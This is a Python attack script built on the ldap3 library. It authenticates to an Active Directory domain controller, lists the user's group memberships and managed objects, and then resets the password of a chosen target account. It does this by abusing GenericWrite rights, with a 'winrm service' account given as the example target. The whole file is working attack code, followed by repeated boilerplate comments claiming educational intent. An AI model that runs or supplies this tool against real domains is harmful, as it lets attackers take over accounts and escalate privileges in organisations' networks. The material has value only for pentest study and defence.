import argparse
import getpass
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE
import ssl


def get_ldap_connection(dc_ip, domain, username, password):
    server = Server(dc_ip, use_ssl=True, get_info=ALL)
    try:
        conn = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            auto_bind=True
        )
        return conn
    except Exception as e:
        print(f"[!] LDAP connection failed: {e}")
        exit(1)


def list_user_groups_and_managed_objects(conn, domain, username):
    # Build the base DN from the domain (e.g., DC=domain,DC=com)
    base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
    # Search for the user by sAMAccountName
    conn.search(
        search_base=base_dn,
        search_filter=f'(sAMAccountName={username})',
        attributes=['memberOf', 'managedObjects']
    )

    if not conn.entries:
        print("[!] Could not retrieve user information.")
        return

    user_info = conn.entries[0]
    groups = user_info.memberOf.values if 'memberOf' in user_info else []
    managed = user_info.managedObjects.values if 'managedObjects' in user_info else []

    print("\n[+] Member of groups:")
    for g in groups:
        print(f"    - {g}")

    print("\n[+] Manages the following objects:")
    for m in managed:
        print(f"    - {m}")


def prompt_password():
    while True:
        new_password = getpass.getpass("Enter new password: ")
        confirm_password = getpass.getpass("Confirm new password: ")
        if new_password == confirm_password:
            return f'"{new_password}"'.encode('utf-16-le')  # Required format for AD
        else:
            print("[!] Passwords do not match. Please try again.\n")


def reset_password(conn, target_dn, encoded_password):
    print(f"[+] Attempting password reset for: {target_dn}")
    success = conn.modify(
        dn=target_dn,
        changes={'unicodePwd': [(MODIFY_REPLACE, [encoded_password])]}
    )
    if success:
        print("[+] Password reset successful.")
    else:
        print(f"[!] Password reset failed: {conn.result['description']}")


def main():
    parser = argparse.ArgumentParser(description="Reset a user's password in AD using LDAP and GenericWrite.")
    parser.add_argument("--dc-ip", required=True, help="Domain Controller IP")
    parser.add_argument("--domain", required=True, help="Domain name")
    parser.add_argument("--username", required=True, help="Authenticated username")
    parser.add_argument("--password", required=False, help="Authenticated user's password")

    args = parser.parse_args()
    if not args.password:
        args.password = getpass.getpass("Password for authenticated user: ")

    conn = get_ldap_connection(args.dc_ip, args.domain, args.username, args.password)
    list_user_groups_and_managed_objects(conn, args.domain, args.username)

    target_cn = input("\nEnter the CN of the user you want to reset the password for (e.g., winrm service): ")
    target_dn = f"CN={target_cn},CN=Users,DC={args.domain.split('.')[0]},DC={args.domain.split('.')[1]}"

    encoded_pwd = prompt_password()
    reset_password(conn, target_dn, encoded_pwd)

    conn.unbind()


if __name__ == "__main__":
    main()





# Ensure you have the ldap3 library installed:
# pip install ldap3
# Make sure to run this script with appropriate permissions and in a secure environment.
# This script is intended for educational purposes only and should not be used for unauthorized access.
# Note: The password must be quoted and encoded in UTF-16LE format for LDAP operations.
# The target DN should be the distinguished name of the user whose password you want to reset.
# Ensure that the user has the necessary permissions to perform this operation.
# This script connects to an LDAP server and resets the password for a specified user.
# It uses NTLM authentication and requires the ldap3 library.
# The password must be quoted and encoded in UTF-16LE format.
# The target DN should be the distinguished name of the user whose password you want to reset.
# Ensure that the user has the necessary permissions to perform this operation.
# This script is intended for educational purposes only and should not be used for unauthorized access.
# Make sure to run this script with appropriate permissions and in a secure environment.